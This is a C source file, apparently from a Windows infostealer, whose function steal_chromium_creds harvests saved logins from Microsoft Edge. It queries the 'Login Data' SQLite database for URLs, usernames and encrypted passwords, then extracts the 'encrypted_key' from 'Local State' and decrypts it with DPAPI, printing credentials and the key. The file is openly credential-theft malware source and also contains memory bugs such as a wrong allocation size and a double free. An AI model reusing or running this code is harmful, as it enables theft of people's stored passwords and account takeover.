// clang-format off
// knownfolders needs to be after shlobj
#include <shlobj.h>
#include <knownfolders.h>
// clang-format on

#include "chromium.h"

#include <dpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <windows.h>

#include "base64.h"
#include "path.h"
#include "sqlite3.h"

// TODO Make this a parameter so that we can support multiple chromium browsers
#define LOGINDATA_PATH L"\\Microsoft\\Edge\\User Data\\Default\\Login Data"
#define LOCAL_STATE_FILE L"\\Microsoft\\Edge\\User Data\\Local State"

// Retrieves "url login and password" from a chromium based browser sqlite
// database
// Returns an array of `LoginInfo` of size `count` the `password` in a
// `LoginInfo` is still encrypted at this point
// NOTE: Must be ran while the browser is NOT started otherwise the database is
// locked by the browser
// NOTE: `loginsOut` must be freed by the caller
static int retrieve_logins(const PWSTR fullPath, int *loginCountOut,
                    LoginInfo **loginsOut) {
  sqlite3 *db;
  int rc = sqlite3_open16(fullPath, &db);
  if (rc) {
    fprintf(stderr, "Can't open database: %s", sqlite3_errmsg(db));
    *loginsOut = NULL;
    *loginCountOut = 0;
    return EXIT_FAILURE;
  }

  // I think it's the same for every chromium browsers though I haven't checked
  const char *query =
      "SELECT origin_url, username_value, password_value FROM logins;";
  sqlite3_stmt *statement;
  rc = sqlite3_prepare_v2(db, query, -1, &statement, 0);
  if (rc != SQLITE_OK) {
    fprintf(stderr, "Failed to execute statement: %s", sqlite3_errmsg(db));
    sqlite3_close(db);
    *loginsOut = NULL;
    *loginCountOut = 0;
    return EXIT_FAILURE;
  }

  int capacity = 10;   // size of the **allocated** array
  *loginCountOut = 0;  // real size (number of elements) of the array
  *loginsOut = (LoginInfo *)malloc(capacity * sizeof(LoginInfo *));

  if (!*loginsOut) {
    fprintf(stderr, "Failed to allocate memory for LoginInfo");
    sqlite3_finalize(statement);
    sqlite3_close(db);
    return EXIT_FAILURE;
  }

  // go over each row and grow our `loginsOut` accordingly
  while ((rc = sqlite3_step(statement)) == SQLITE_ROW) {
    if (*loginCountOut >= capacity) {
      capacity += 10;  // grow the allocated array by this much
      *loginsOut =
          (LoginInfo *)realloc(*loginsOut, capacity * sizeof(LoginInfo *));
      if (!*loginsOut) {
        fprintf(stderr, "Failed to reallocate memory for LoginInfo");
        sqlite3_finalize(statement);

        return EXIT_FAILURE;
      }
    }

    const unsigned char *url = sqlite3_column_text(statement, 0);
    const unsigned char *username = sqlite3_column_text(statement, 1);
    const unsigned char *password = sqlite3_column_text(statement, 2);

    (*loginsOut)[*loginCountOut].url = strdup((const char *)url);
    (*loginsOut)[*loginCountOut].username = strdup((const char *)username);
    (*loginsOut)[*loginCountOut].password = strdup((const char *)password);

    (*loginCountOut)++;
  }

  sqlite3_finalize(statement);
  sqlite3_close(db);

  return EXIT_SUCCESS;
}

// Frees an array of LoginInfo instance
void free_logins(LoginInfo *logins, int count) {
  for (int i = 0; i < count; i++) {
    free(logins[i].url);
    free(logins[i].username);
    free(logins[i].password);
  }
  free(logins);
}

// Should work all the time (upcasting == less problems)
// NOTE: `wideStringOut` must be freed by the caller
int uf8_to_utf16(PSTR multiByteString, PWSTR *wideStringOut) {
  if (!multiByteString) {
    return EXIT_FAILURE;
  }

  int wideCharCount =
      MultiByteToWideChar(CP_ACP, 0, multiByteString, -1, NULL, 0);
  if (wideCharCount == 0) {
    fprintf(stderr, "Failed to get wide character count. Error code: %lu\n",
            GetLastError());
    return EXIT_FAILURE;
  }

  *wideStringOut = (PWSTR)malloc(wideCharCount * sizeof(wchar_t));
  if (!*wideStringOut) {
    fprintf(stderr, "Failed to allocate memory for wide string.\n");
    return EXIT_FAILURE;
  }

  if (MultiByteToWideChar(CP_ACP, 0, multiByteString, -1, *wideStringOut,
                          wideCharCount) == 0) {
    fprintf(stderr, "Failed to convert ANSI to wide string. Error code: %lu\n",
            GetLastError());
    free(*wideStringOut);
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}

// NOTE: `encryptedKeyOut` must be freed by the caller
static int retrieve_encrypted_key(PWSTR localStatePath, PSTR *encryptedKeyOut) {
  HANDLE fileHandle =
      CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL,
                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (fileHandle == INVALID_HANDLE_VALUE) {
    printf("Failed to open file. Error code: %lu\n", GetLastError());
    return EXIT_FAILURE;
  }

  DWORD fileSize = GetFileSize(fileHandle, NULL);
  if (fileSize == INVALID_FILE_SIZE) {
    printf("Failed to get file size. Error code: %lu\n", GetLastError());
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  // characters in the file are encoded in ASCII, we can't use wide characters
  // here so we will only convert the final result, later on for compatibility
  PSTR fileBuffer = (PSTR)malloc(fileSize + 1);
  if (!fileBuffer) {
    printf("Failed to allocate memory for file buffer.\n");
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }

  DWORD bytesRead;
  if (!ReadFile(fileHandle, fileBuffer, fileSize * sizeof(char), &bytesRead,
                NULL)) {
    printf("Failed to read file. Error code: %lu\n", GetLastError());
    free(fileBuffer);
    CloseHandle(fileHandle);
    return EXIT_FAILURE;
  }
  CloseHandle(fileHandle);

  fileBuffer[fileSize] = '\0';  // terminate the buffer

  const char *key = "\"encrypted_key\":";
  PSTR cursor = strstr(fileBuffer, key);
  if (!cursor) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  // skip the key
  cursor += strlen(key);
  // skip whitespace and the beginning quote
  while (*cursor == ' ' || *cursor == '\t' || *cursor == '"') {
    cursor++;
  }

  // keep start position of the encrypted key
  PSTR start = cursor;
  // cursor now points to the end of the encrypted key (to get the length)
  while (*cursor != '"') {
    cursor++;
  }

  size_t length = cursor - start;
  *encryptedKeyOut = (PSTR)malloc(length + 1);
  if (!*encryptedKeyOut) {
    free(fileBuffer);
    return EXIT_FAILURE;
  }

  strncpy(*encryptedKeyOut, start, length);
  (*encryptedKeyOut)[length] = '\0';
  
  free(fileBuffer);
  return EXIT_SUCCESS;
}

// decrypt an encrypted_key using DPAPI
// NOTE return value must be freed
static int decrypt_key(BYTE *encryptedKey, DWORD encryptedKeyLen,
                PSTR *decryptedKeyOut) {
  DATA_BLOB encryptedBlob;
  encryptedBlob.pbData = encryptedKey;
  encryptedBlob.cbData = encryptedKeyLen;

  DATA_BLOB decryptedBlob;
  if (!CryptUnprotectData(&encryptedBlob, NULL, NULL, NULL, NULL, 0,
                          &decryptedBlob)) {
    printf("Failed to decrypt data. Error code: %lu\n", GetLastError());
    return EXIT_FAILURE;
  }

  *decryptedKeyOut = (PSTR)malloc(decryptedBlob.cbData + 1);
  if (!*decryptedKeyOut) {
    LocalFree(decryptedBlob.pbData);
    printf("Failed to allocate memory for decrypted key.\n");
    return EXIT_FAILURE;
  }

  memcpy(*decryptedKeyOut, decryptedBlob.pbData, decryptedBlob.cbData);
  (*decryptedKeyOut)[decryptedBlob.cbData] = '\0';

  LocalFree(decryptedBlob.pbData);

  return EXIT_SUCCESS;
}

int steal_chromium_creds() {
  PWSTR localAppdataPath;
  if (get_localappdata_path(&localAppdataPath)) {
    fprintf(stderr, "Unable to get local appdata PATH");
    return EXIT_FAILURE;
  }

  PWSTR loginDataPath;
  if (concat_paths(localAppdataPath, LOGINDATA_PATH, &loginDataPath)) {
    CoTaskMemFree(
        localAppdataPath);  // free memory from the call to SHGetKnownFolderPath
                            // in `get_localappdata_path`
    return 1;
    return EXIT_FAILURE;
  }

  /// DEBUG
  wprintf(L"Full path: %ls\n", loginDataPath);
  ///

  LoginInfo *logins = NULL;
  int count = 0;
  if (retrieve_logins(loginDataPath, &count, &logins)) {
    fprintf(stderr, "Could not retrieve logins from the database");
    return EXIT_FAILURE;
  }

  /// DEBUG
  for (int i = 0; i < count; i++) {
    printf("===== LOGIN %d =====\n", i);
    printf("Origin URL: %s\n", logins[i].url);
    printf("Username: %s\n", logins[i].username);
    printf("Password: %s\n", logins[i].password);
  }
  printf("====================\n");
  ///

  PWSTR loginStatePath;
  if (concat_paths(localAppdataPath, LOCAL_STATE_FILE, &loginStatePath)) {
    fwprintf(stderr, L"Could not concatenate %ls and %ls", localAppdataPath,
             LOCAL_STATE_FILE);
    return EXIT_FAILURE;
  }
  /// DEBUG
  wprintf(L"loginStatePath: %ls\n", loginStatePath);
  ///

  PSTR encryptedKey;
  if (retrieve_encrypted_key(loginStatePath, &encryptedKey)) {
    wprintf(L"Could not retrieve key from %s\n", loginStatePath);
    return EXIT_FAILURE;
  }
  /// DEBUG
  printf("Encrypted key (base64): %s\n", encryptedKey);
  ///

  int decodedKeySize = b64d_size(strlen(encryptedKey));
  BYTE *decodedKey = (BYTE *)malloc(decodedKeySize + 1);
  b64_decode((BYTE *)encryptedKey, strlen(encryptedKey), decodedKey);
  decodedKey[decodedKeySize] = '\0';
  /// DEBUG
  printf("decoded_encrypted_key_len: %d\n", decodedKeySize);
  ///

  // Remove the DPAPI at the start as this not part of the key
  // Allocate memory for the new string
  BYTE *cleanDecodedKey = (BYTE *)malloc(decodedKeySize - 5);

  // Copy the substring starting from the 6th character
  memcpy(cleanDecodedKey, (decodedKey + 5), decodedKeySize - 5);

  PSTR decryptedKey;
  if (decrypt_key((BYTE *)cleanDecodedKey, decodedKeySize - 5, &decryptedKey)) {
    fprintf(stderr, "Could not decrypt key using DPAPI\n");
    return EXIT_FAILURE;
  }
  /// DEBUG
  printf("decrypted_key: %s\n", decryptedKey);
  ///

  free_logins(logins, count);
  free(decryptedKey);  // allocated in decrypt_key
  free(encryptedKey);  // allocated in retrieve_encrypted_key
  free(localAppdataPath); // allocated in
  free(loginDataPath);
  CoTaskMemFree(
      localAppdataPath);  // free memory from the call to SHGetKnownFolderPath
                          // in `get_localappdata_path`
  return EXIT_SUCCESS;
}
